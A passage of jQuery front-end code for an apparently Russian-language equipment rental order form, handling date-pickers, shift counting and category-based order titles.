    function declOfNum(n, text_forms) {
        n = Math.abs(n) % 100; var n1 = n % 10;
        if (n > 10 && n < 20) { return text_forms[2]; }
        if (n1 > 1 && n1 < 5) { return text_forms[1]; }
        if (n1 == 1) { return text_forms[0]; }
        return text_forms[2];
    };
    $('.tips').children('.presently').click(function () {
        var todayDate = new Date();
        // var minData = todayDate.getMonth()+1+'.'+todayDate.getDate()+'.'+todayDate.getFullYear();
        var Month = todayDate.getMonth()+1;
        var minData = todayDate.getDate()+'.'+Month+'.'+todayDate.getFullYear();
        $(  "#date-start" ).val(minData);
        $(  "#date-start" ).datepicker( "option", "minDate" , minData);
        $('#date-end').prop('disabled' , false);
        $('#date-end').datepicker( "option", "minDate" , $('#date-start').val() );
        return false;
    });
    $('.tips').children('.tomorrow').click(function () {
        var todayDate = new Date();
        // var minData = todayDate.getMonth()+1+'.'+todayDate.getDate()+'.'+todayDate.getFullYear();
        var Month = todayDate.getMonth()+1;
        var day = todayDate.getDate()+1;
        var minData = day+'.'+Month+'.'+todayDate.getFullYear();
        $(  "#date-start" ).val(minData);
        $(  "#date-start" ).datepicker( "option", "minDate" , minData);
        $('#date-end').prop('disabled' , false);
        $('#date-end').datepicker( "option", "minDate" , $('#date-start').val() );
        return false;
    });
    $('#create-inpCount').keyup(function () {

        if ((event.which < 48 || event.which > 57)) {
            $(this).val($(this).val().replace(/[^\d].+/, ""));
            event.preventDefault();
        }else {

            $(this).val($(this).val().replace(/[^\d].+/, ""));
            var text1 = $(this).val();
            var text = text1 + " шт"
            $(document).find('.form-control-new').children('.Subcategory5').html(text);
            $(document).find('input[name="nameCountTehn_hidden"]').val(text1);
        }

    });
    $('#create-inp-category').change(function () {

        $(document).find('.titleNewOrder').find('.SubcategoryType').remove();
        $(document).find('.titleNewOrder').find('.SubcategoryType2').remove();
        $(document).find('.titleNewOrder').find('.SubcategoryType3').remove();


        $('#properties').hide();
        if($(this).children('option:selected').hasClass('notInp')){
            return false;
        }
        $('.notInpCategory').remove();
        if($('#create-inp-subcategory').hasClass('selectedSubCategory')){
            $('#create-inp-subcategory ').addClass('required');

            $('body').find('.notInpSubCategory').remove();
            $('#create-inp-subcategory').prepend(' <option targCode="" selected class="notInp notInpSubCategory" value="">&nbsp;</option>');
        }
        $('.titleNewOrder').children('.Subcategory:eq(1)').remove();
        $('.moreOption_0').remove();
        $('.moreOption_1').remove();
        $('.moreOption_2').remove();
        $('#create-inp-subcategory').prop('disabled' , false);
        $('#create-inp-city').prop('disabled' , false);
        function explode(){
            var text = $('body').find('#select2-create-inp-subcategory-container').text();
            $('.titleNewOrder').children('.Subcategory:eq(0)').text(text+' ');
            var name = $('.titleNewOrder').find('.titleNewTask:eq(0)').text();
            $('.autoloadName').val(name);
        }
        setTimeout(explode, 100);
    });
    $('body').on('change' , '.categoryStyle[name="harectic_0"]' , function () {
        var textSubCategory = $('.categoryStyle[name="harectic_0"] option:selected').text();
        $('.titleNewOrder').children('.moreOption_0').text(textSubCategory+' ');
    });
    $('body').on('change' , '.categoryStyle[name="harectic_1"]' , function () {
        var textSubCategory = $('.categoryStyle[name="harectic_1"] option:selected').text();
        $('.titleNewOrder').children('.moreOption_1').text(textSubCategory+' ');
    });
    $('body').on('change' , '.categoryStyle[name="harectic_2"]' , function () {
        var textSubCategory = $('.categoryStyle[name="harectic_2"] option:selected').text();
        $('.titleNewOrder').children('.moreOption_2').text(textSubCategory+' ');
    });
    $('body').on('change' , '.categoryStyle_0' , function () {
        $('.SubcategoryType').remove();

        if($('body').find('.categoryStyle_1').hasClass('opened') ){
            if($('body').find('.categoryStyle_1').children('option').hasClass('notSelected')){


            }else {

                $(document).find('.SubcategoryType2').remove();
                $(document).find('.SubcategoryType3').remove();
                $('body').find('.categoryStyle_1').prepend('<option class="notSelected" selected value="">&nbsp;</option> ');
            }
            if($('body').find('.categoryStyle_2').children('option').hasClass('notSelected')){

            }else {
                $('body').find('.categoryStyle_2').prepend('<option class="notSelected" selected value="">&nbsp;</option> ');
            }
            $('body').find('.categoryStyle_2').prop('disabled' , true);
            $('body').find('.categoryStyle_2').removeClass('opened');
        };
        $('body').find('.categoryStyle_1').prop('disabled' , false);
        $('body').find('.categoryStyle_1').addClass('opened');
        if( $('body').find('.categoryStyle_0 option:selected').hasClass('notSelected')){
            return false;
        }else {
            $('body').find('.categoryStyle_0').find('.notSelected').remove();
        }
        var text = $('.categoryStyle_0 option:selected').text();

        var text = text.toLowerCase();

        $('.titleNewOrder').append('<p class="titleNewTask SubcategoryType" >'+text+'  </p>');
    });
    $('body').on('change' , '.categoryStyle_1' , function () {
        $('.SubcategoryType2').remove();
        if($('body').find('.categoryStyle_2').hasClass('opened') ){
            $('body').find('.categoryStyle_2').prop('disabled' , true);
            $('body').find('.categoryStyle_2').removeClass('opened');
            if($('body').find('.categoryStyle_2').children('option').hasClass('notSelected')){
            }else {

                $(document).find('.SubcategoryType3').remove();
                $('body').find('.categoryStyle_2').prepend('<option class="notSelected" selected value="">&nbsp;</option> ');
            }
        };
        $('body').find('.categoryStyle_2').prop('disabled' , false);
        $('body').find('.categoryStyle_2').addClass('opened');
        if( $('body').find('.categoryStyle_1 option:selected').hasClass('notSelected')){
            return false;
        }else {
            $('body').find('.categoryStyle_1 option:selected').find('.notSelected').remove();
        }
        var text = $('.categoryStyle_1 option:selected').text();
        $('.titleNewOrder').append('<p class="titleNewTask SubcategoryType2" >'+text+' </p>');

    });
    $('body').on('change' , '.categoryStyle_2' , function () {
        $('.SubcategoryType3').remove();

        var text = $('.categoryStyle_2 option:selected').text();
        $('.titleNewOrder').append('<p class="titleNewTask SubcategoryType3" >'+text+' </p>');
    });
    $('body').on('change' , '.categoryStyle' , function () {
        if($(this).children('option:selected').hasClass('optSel')){
            $(this).children('.notSelected').remove();
            $(this).addClass('dopSelected');
        }
    });

    $('body').on('change' , '#create-inp-subcategory' , function () {
        $('.notInpSubCategory').remove();
        $('#create-inp-subcategory').addClass('selectedSubCategory');
        $('.moreOption_0').remove();
        $('.moreOption_1').remove();
        $('.moreOption_2').remove();
        $('body').find('.SubcategoryType').remove();
        $('body').find('.SubcategoryType2').remove();
        $('body').find('.SubcategoryType3').remove();
        $('#properties').show();
        var textSubCategory = $('#create-inp-subcategory option:selected').text();
        var valueSubCategory = $('#create-inp-subcategory option:selected').attr('targcode');
        $('.iblock_class_set').val(valueSubCategory);
        console.log(valueSubCategory);
        $('#create-inp-subcategory ').removeClass('required');
        // $('#create-inp-subcategory option[value="'+valueSubCategory+'"]').attr('selected' , 'selected');


        $('.titleNewOrder').children('.Subcategory').text(textSubCategory+' ');
        var name = $('.titleNewOrder').find('.titleNewTask').text();
        $('.autoloadName').val(name);
    } )
    if($('.moderation-rejected')){
        $('.moderation-rejected').click(function () {
        });
    };
    $('#date-start').change(function () {
        $('#date-end').prop('disabled' , false);
        var dateStartInp  = $('#date-start').val();
        var dateStartInp =  dateStartInp.split('.').join('/');
        var dateStartAll = new Date(dateStartInp);
        dateStartAll.setDate(dateStartAll.getDate() + 1);
        var Month = dateStartAll.getMonth()+1;
        var minData = dateStartAll.getDate()+'.'+Month+'.'+dateStartAll.getFullYear();
        $('#date-end').datepicker( "option", "minDate" , $('#date-start').val() );
        var dateEnd = $('#date-end').val();
        if(dateEnd !== ''){
            $('.dataCountday').children('.CountDay').remove();
            var dataEnd =  $('#date-end').val().split('.').join('/');
            var dataStart = $('#date-start').val().split('.').join('/');
            var date1 = moment(dataStart , 'DD/MM/YYYY');
            var date2 = moment(dataEnd , 'DD/MM/YYYY');
            var Difference_In_Days = date2.diff(date1, 'days');
            var Difference_In_Days = Difference_In_Days +  1;
            var countWord = declOfNum(Difference_In_Days , ['смену', 'смены', 'смен']);

            $('.dataCountday').append('<p class="titleNewTask CountDay CountDayArend">Аренда на ' + Difference_In_Days +' '+countWord+'</p>');

            var name = $('.titleNewOrder').find('.titleNewTask').text();
            $('.autoloadName').val(name);
        }
    });
    $('#date-end').change(function () {
        $('.dataCountday').children('.CountDay').remove();
        var dataEnd =  $('#date-end').val().split('.').join('/');
        var dataStart = $('#date-start').val().split('.').join('/');
        var date1 = moment(dataStart , 'DD/MM/YYYY');
        var date2 = moment(dataEnd , 'DD/MM/YYYY');
        var Difference_In_Days = date2.diff(date1, 'days');
        var Difference_In_Days = Difference_In_Days +  1;
        var countWord = declOfNum(Difference_In_Days , ['смену', 'смены', 'смен']);
        $('.dataCountday').append('<p class="titleNewTask CountDay CountDayArend">Аренда на ' + Difference_In_Days +' '+countWord+'</p>');
        var name = $('.titleNewOrder').find('.titleNewTask').text();
        $('.autoloadName').val(name);
    });
    $('.newStateCheck').click(function () {
       if( $(this).closest('div').find('.contract-inp:checked')){

           $(this).closest('div').find('.contract-inp').prop('checked',true);
           alert('true');
       }else {
           $(this).closest('div').find('.contract-inp').prop('checked',false);
           alert('false');
       }
    });
});
